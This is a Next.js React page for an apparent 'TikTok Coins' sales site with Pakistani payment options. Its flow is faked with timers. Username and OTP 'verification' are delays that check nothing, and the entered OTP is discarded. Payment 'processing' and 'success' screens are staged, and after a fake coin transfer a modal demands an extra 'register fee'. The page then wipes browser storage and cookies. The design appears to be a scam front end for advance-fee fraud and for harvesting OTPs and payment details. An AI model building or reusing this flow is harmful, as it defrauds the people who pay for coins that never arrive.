"use client"

import { useState } from "react"
import Image from "next/image"
import { HeroSection } from "@/components/hero-section"
import { CoinsSection } from "@/components/coins-section"
import { VerificationModal } from "@/components/verification-modal"
import { PaymentSuccessfulModal } from "@/components/payment-successful-modal"
import { TransferProgressModal } from "@/components/transfer-progress-modal"
import { RegisterFeeModal } from "@/components/register-fee-modal"
import { ReceiptModal } from "@/components/receipt-modal"
import { PaymentDetailsModal } from "@/components/payment-details-modal"
import { ThankYouModal } from "@/components/thank-you-modal"
import { Footer } from "@/components/footer"
import { OtpModal } from "@/components/otp-modal"
import CoinImage from "@/app/Assests/imgs/stack-gold-coins_108855-486.jpg"
export default function TikTokCoinsPage() {
  const [username, setUsername] = useState("")
  const [isUsernameVerified, setIsUsernameVerified] = useState(false)
  const [showVerification, setShowVerification] = useState(false)
  const [showOtpModal, setShowOtpModal] = useState(false)
  const [showOtpVerification, setShowOtpVerification] = useState(false)
  const [showCoinsSection, setShowCoinsSection] = useState(false)
  const [selectedCoinData, setSelectedCoinData] = useState<{
    coins: number
    price: number
  } | null>(null)
  const [selectedPayment, setSelectedPayment] = useState<string | null>(null)
  const [showPaymentSuccess, setShowPaymentSuccess] = useState(false)
  const [showSendCoinsLoading, setShowSendCoinsLoading] = useState(false)
  const [showTransferProgress, setShowTransferProgress] = useState(false)
  const [showRegisterFee, setShowRegisterFee] = useState(false)
  const [showReceipt, setShowReceipt] = useState(false)
  const [verificationId, setVerificationId] = useState("")
  const [showError, setShowError] = useState(false)
  const [showCheckoutScreen, setShowCheckoutScreen] = useState(false)
  const [showPaymentLoading, setShowPaymentLoading] = useState(false)
  const [showPaymentDetailsModal, setShowPaymentDetailsModal] = useState(false)
  const [bankName, setBankName] = useState<string | undefined>()
  const [showThankYou, setShowThankYou] = useState(false)

  const generateVerificationId = () => {
    return `VER-${Math.random().toString(36).substring(2, 10).toUpperCase()}`
  }

  const handleUsernameSubmit = (user: string) => {
    setUsername(user)
    setShowVerification(true)
    setIsUsernameVerified(false)
    setShowCoinsSection(false)

    setTimeout(() => {
      setShowVerification(false)
      setShowOtpModal(true)
    }, 8000)
  }

  const handleOtpSubmit = (_otp: string) => {
    setShowOtpModal(false)
    setShowOtpVerification(true)

    setTimeout(() => {
      setShowOtpVerification(false)
      setIsUsernameVerified(true)
      setShowCoinsSection(true)
    }, 3000)
  }

  const handleGetCoins = () => {
    if (!isUsernameVerified) {
      setShowError(true)
      setTimeout(() => setShowError(false), 3000)
      return
    }
    setShowCoinsSection(true)
  }

  const handleBuyNow = () => {
    if (!isUsernameVerified) {
      setShowError(true)
      setTimeout(() => {
        setShowError(false)
        setShowCoinsSection(false)
      }, 2000)
    } else if (selectedCoinData) {
      setShowCheckoutScreen(true)
    }
  }

  const handleBackFromCoins = () => {
    setShowCoinsSection(false)
    setSelectedCoinData(null)
    setSelectedPayment(null)
    window.scrollTo({ top: 0, behavior: 'smooth' })
  }

  const handleCoinSelect = (coins: number, price: number) => {
    if (!isUsernameVerified) {
      setShowError(true)
      setTimeout(() => setShowError(false), 3000)
      return
    }
    setSelectedCoinData({ coins, price })
    setSelectedPayment(null)
  }

  const handlePaymentSelect = (method: string) => {
    setSelectedPayment(method)
  }

  const handlePayNow = () => {
    if (!selectedPayment) return
    setShowPaymentDetailsModal(true)
  }

  const handlePaymentDetailsConfirm = (selectedBankName?: string) => {
    if (selectedBankName) {
      setBankName(selectedBankName)
    }
    const vid = generateVerificationId()
    setVerificationId(vid)
    setShowPaymentDetailsModal(false)

    // Show loading modal for 4 seconds
    setShowPaymentLoading(true)
    setTimeout(() => {
      setShowPaymentLoading(false)
      setShowPaymentSuccess(true)
    }, 4000)
  }

  const handleSendCoins = () => {
    setShowSendCoinsLoading(true)
    setShowPaymentSuccess(false)

    setTimeout(() => {
      setShowSendCoinsLoading(false)
      setShowTransferProgress(true)
    }, 2000)
  }

  const handleTransferComplete = () => {
    setShowTransferProgress(false)
    setShowRegisterFee(true)
  }

  const handleRegisterFeePayment = () => {
    setShowRegisterFee(false)
    setShowReceipt(true)
  }

  const handleReceiptClose = () => {
    setShowReceipt(false)
    setShowThankYou(true)
  }

  const handleThankYouClose = () => {
    setShowThankYou(false)
    setShowOtpModal(false)
    setShowOtpVerification(false)
    setShowVerification(false)
    // Reset all states
    setSelectedCoinData(null)
    setSelectedPayment(null)
    setShowCheckoutScreen(false)
    setShowCoinsSection(false)
    setUsername("")
    setIsUsernameVerified(false)
    setBankName(undefined)
    
    // Clear all storage
    localStorage.clear()
    sessionStorage.clear()
    
    // Clear all cookies
    document.cookie.split(";").forEach((c) => {
      document.cookie = c
        .replace(/^ +/, "")
        .replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`)
    })
    
    // Scroll to top (email section)
    window.scrollTo({ top: 0, behavior: 'smooth' })
  }

  return (
    <div className="min-h-screen bg-black text-white">
      {!showCheckoutScreen && (
        <>
          <HeroSection onUsernameSubmit={handleUsernameSubmit} showCoinsSection={showCoinsSection} onGetCoins={handleGetCoins} isUsernameVerified={isUsernameVerified} />

          <CoinsSection
            isVisible={showCoinsSection}
            selectedCoinData={selectedCoinData}
            selectedPayment={selectedPayment}
            onCoinSelect={handleCoinSelect}
            onPaymentSelect={handlePaymentSelect}
            onPayNow={handlePayNow}
            onBuyNow={handleBuyNow}
            isEmailVerified={isUsernameVerified}
            onBack={handleBackFromCoins}
          />
        </>
      )}

      {showCheckoutScreen && selectedCoinData && (
        <div className="min-h-screen bg-white text-gray-900 p-4 sm:p-0">
          <div className="flex flex-col lg:flex-row min-h-screen lg:h-screen">
            {/* Left Side - Selected Coin Info */}
            <div className="w-full lg:w-1/2 bg-linear-to-br from-red-50 to-pink-50 p-6 sm:p-8 md:p-12 flex flex-col justify-center items-center relative">
              <button
                onClick={() => {
                  setShowCheckoutScreen(false)
                  setShowCoinsSection(true)
                }}
                className="absolute top-4 left-4 sm:top-6 sm:left-6 md:top-8 md:left-8 text-gray-600 hover:text-gray-900 text-xl sm:text-2xl font-bold transition-colors duration-200"
              >
                ← Back
              </button>
              
              <div className="text-center mt-12 sm:mt-0">
                <div className="mb-6 sm:mb-8">
                  <div className="relative w-24 h-24 sm:w-28 sm:h-28 md:w-32 md:h-32 mx-auto rounded-full overflow-hidden shadow-lg">
                    <Image
                      src={CoinImage}
                      alt="TikTok Coins"
                      fill
                      className="object-cover"
                    />
                  </div>
                </div>
                <h2 className="text-4xl sm:text-5xl md:text-6xl font-extrabold text-red-600 mb-3 sm:mb-4">
                  {selectedCoinData.coins >= 1000 ? `${(selectedCoinData.coins / 1000)}M` : `${selectedCoinData.coins}k`}
                </h2>
                <p className="text-lg sm:text-xl md:text-2xl text-gray-600 mb-6 sm:mb-8">TikTok Coins</p>
                <div className="text-3xl sm:text-4xl md:text-5xl font-bold text-gray-900">
                  ${selectedCoinData.price}
                </div>
              </div>
            </div>

            {/* Right Side - Payment Methods */}
            <div className="w-full lg:w-1/2 p-6 sm:p-8 md:p-12 flex flex-col justify-center">
              <h2 className="text-2xl sm:text-3xl font-bold mb-6 sm:mb-8 text-gray-900">Select Payment Method</h2>
              
              <div className="grid grid-cols-2 gap-3 sm:gap-4 md:gap-6 mb-6 sm:mb-8">
                <div
                  onClick={() => handlePaymentSelect("bank")}
                  className={`p-4 sm:p-6 md:p-8 border-2 rounded-xl sm:rounded-2xl cursor-pointer transition-all duration-300 hover:shadow-lg ${
                    selectedPayment === "bank" ? "border-red-600 bg-red-50 shadow-lg" : "border-gray-200 bg-white hover:border-red-300"
                  }`}
                >
                  <div className="text-3xl sm:text-4xl md:text-5xl mb-2 sm:mb-4 text-center">🏦</div>
                  <div className="text-xs sm:text-sm md:text-lg font-semibold text-center text-gray-900">Bank Transfer</div>
                </div>

                <div
                  onClick={() => handlePaymentSelect("jazz")}
                  className={`p-4 sm:p-6 md:p-8 border-2 rounded-xl sm:rounded-2xl cursor-pointer transition-all duration-300 hover:shadow-lg ${
                    selectedPayment === "jazz" ? "border-red-600 bg-red-50 shadow-lg" : "border-gray-200 bg-white hover:border-red-300"
                  }`}
                >
                  <div className="text-3xl sm:text-4xl md:text-5xl mb-2 sm:mb-4 text-center">📱</div>
                  <div className="text-xs sm:text-sm md:text-lg font-semibold text-center text-gray-900">JazzCash</div>
                </div>

                <div
                  onClick={() => handlePaymentSelect("easy")}
                  className={`p-4 sm:p-6 md:p-8 border-2 rounded-xl sm:rounded-2xl cursor-pointer transition-all duration-300 hover:shadow-lg ${
                    selectedPayment === "easy" ? "border-red-600 bg-red-50 shadow-lg" : "border-gray-200 bg-white hover:border-red-300"
                  }`}
                >
                  <div className="text-3xl sm:text-4xl md:text-5xl mb-2 sm:mb-4 text-center">💳</div>
                  <div className="text-xs sm:text-sm md:text-lg font-semibold text-center text-gray-900">EasyPaisa</div>
                </div>

                <div
                  onClick={() => handlePaymentSelect("card")}
                  className={`p-4 sm:p-6 md:p-8 border-2 rounded-xl sm:rounded-2xl cursor-pointer transition-all duration-300 hover:shadow-lg ${
                    selectedPayment === "card" ? "border-red-600 bg-red-50 shadow-lg" : "border-gray-200 bg-white hover:border-red-300"
                  }`}
                >
                  <div className="text-3xl sm:text-4xl md:text-5xl mb-2 sm:mb-4 text-center">💰</div>
                  <div className="text-xs sm:text-sm md:text-lg font-semibold text-center text-gray-900">Credit Card</div>
                </div>
              </div>

              <button
                onClick={handlePayNow}
                disabled={!selectedPayment}
                className="w-full py-4 sm:py-5 md:py-6 text-lg sm:text-xl font-bold rounded-xl sm:rounded-2xl bg-red-600 hover:bg-red-700 text-white disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 shadow-lg hover:shadow-xl"
              >
                Pay Now
              </button>
            </div>
          </div>
        </div>
      )}

      <VerificationModal isOpen={showVerification} />

      <OtpModal isOpen={showOtpModal} onSubmit={handleOtpSubmit} />

      <VerificationModal
        isOpen={showOtpVerification}
        durationMs={3000}
        loadingTitle="Verifying OTP..."
        loadingDescription="Please wait while we confirm your code"
        successTitle="OTP Verified Successfully"
        successDescription="You can now continue to purchase coins"
      />

      {/* Payment Loading Modal */}
      {showPaymentLoading && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 animate-in fade-in duration-300">
          <div className="bg-linear-to-br from-[#1a1a1a] to-[#0a0a0a] border-2 border-red-600 rounded-3xl p-12 text-center shadow-[0_0_50px_rgba(255,0,0,0.3)] animate-in zoom-in duration-300">
            <h2 className="text-3xl font-bold mb-8 text-white">Processing Payment...</h2>
            <div className="flex justify-center">
              <div className="relative w-32 h-32">
                <svg className="w-full h-full transform -rotate-90 animate-spin" viewBox="0 0 100 100" style={{ animationDuration: '2s' }}>
                  <circle
                    cx="50"
                    cy="50"
                    r="45"
                    fill="none"
                    stroke="#1a1a1a"
                    strokeWidth="8"
                  />
                  <circle
                    cx="50"
                    cy="50"
                    r="45"
                    fill="none"
                    stroke="url(#paymentGradient)"
                    strokeWidth="8"
                    strokeLinecap="round"
                    strokeDasharray="70 200"
                  />
                  <defs>
                    <linearGradient id="paymentGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                      <stop offset="0%" stopColor="#dc2626" />
                      <stop offset="100%" stopColor="#f87171" />
                    </linearGradient>
                  </defs>
                </svg>
              </div>
            </div>
            <p className="text-gray-400 mt-8">Please wait...</p>
          </div>
        </div>
      )}

      {showError && (
        <div className="fixed top-8 left-1/2 -translate-x-1/2 bg-red-600 text-white px-8 py-4 rounded-xl shadow-lg z-50 animate-in slide-in-from-top duration-300">
          <p className="font-semibold">Please verify your username first!</p>
        </div>
      )}

      {showSendCoinsLoading && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50">
          <div className="bg-linear-to-br from-[#1a1a1a] to-[#0a0a0a] border-2 border-red-600 rounded-3xl p-12">
            <div className="w-32 h-32 animate-spin">
              <svg viewBox="0 0 100 100">
                <circle
                  cx="50"
                  cy="50"
                  r="45"
                  fill="none"
                  stroke="#dc2626"
                  strokeWidth="8"
                  strokeLinecap="round"
                  strokeDasharray="70 200"
                />
              </svg>
            </div>
          </div>
        </div>
      )}

      {selectedCoinData && (
        <>
          <PaymentSuccessfulModal
            isOpen={showPaymentSuccess}
            coins={selectedCoinData.coins}
            verificationId={verificationId}
            onSendCoins={handleSendCoins}
          />

          <TransferProgressModal
            isOpen={showTransferProgress}
            coins={selectedCoinData.coins}
            verificationId={verificationId}
            onComplete={handleTransferComplete}
          />

          <RegisterFeeModal
            isOpen={showRegisterFee}
            coins={selectedCoinData.coins}
            verificationId={verificationId}
            onPayRegisterFee={handleRegisterFeePayment}
          />

          <ReceiptModal
            isOpen={showReceipt}
            registeredName={username}
            coins={selectedCoinData.coins}
            price={selectedCoinData.price}
            verificationId={verificationId}
            bankName={bankName}
            onClose={handleReceiptClose}
          />

          <PaymentDetailsModal
            isOpen={showPaymentDetailsModal}
            paymentMethod={selectedPayment || ""}
            onConfirm={handlePaymentDetailsConfirm}
            onClose={() => setShowPaymentDetailsModal(false)}
          />

          <ThankYouModal
            isOpen={showThankYou}
            onClose={handleThankYouClose}
          />
        </>
      )}
      <Footer />
    </div>
  )
}
